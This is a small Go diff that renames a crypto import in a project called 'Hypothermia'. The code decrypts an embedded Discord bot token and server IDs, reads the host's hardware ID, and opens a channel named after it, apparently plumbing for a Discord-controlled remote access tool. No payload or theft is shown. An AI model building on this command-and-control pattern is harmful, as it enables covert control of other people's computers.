@@ -10,7 +10,7 @@ import (
 
 	"Hypothermia/config"
 	"Hypothermia/src/bot/commands"
-	"Hypothermia/src/utils/crypto/crypt"
+	"Hypothermia/src/utils/crypto"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -52,7 +52,7 @@ func Init() {
 		return
 	}
 
-	realToken := utils_crypto_crypt.DecryptBasic(config.BotToken)
+	realToken := utils_crypto.DecryptBasic(config.BotToken)
 	dg, err := discordgo.New("Bot " + realToken)
 	if err != nil {
 		fmt.Println("manager/4 -", err)
@@ -68,7 +68,7 @@ func Init() {
 		return
 	}
 
-	categoryId := utils_crypto_crypt.DecryptBasic(config.CategoryId)
+	categoryId := utils_crypto.DecryptBasic(config.CategoryId)
 	hwid := getHWID()
 
 	channel, code := getChannel(dg, categoryId, hwid)
@@ -148,7 +148,7 @@ func validateEncrypted(data string) error {
 }
 
 func getChannel(s *discordgo.Session, categoryId string, name string) (id string, code int) {
-	serverId := utils_crypto_crypt.DecryptBasic(config.ServerId)
+	serverId := utils_crypto.DecryptBasic(config.ServerId)
 	channels, err := s.GuildChannels(serverId)
 	if err != nil {
 		return "", 0
